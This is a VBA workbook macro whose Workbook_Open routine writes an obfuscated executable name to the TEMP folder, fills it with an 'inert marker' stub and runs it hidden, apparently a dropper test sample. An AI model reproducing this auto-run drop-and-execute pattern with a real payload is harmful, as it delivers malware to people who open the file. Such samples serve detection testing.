Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\obliv" & "ionx" & "_stu" & "b.exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-this-" & "is-an-in" & "ert-marke" & "r-stu" & "b"
    Close #f
    Shell exe, 0
End Sub
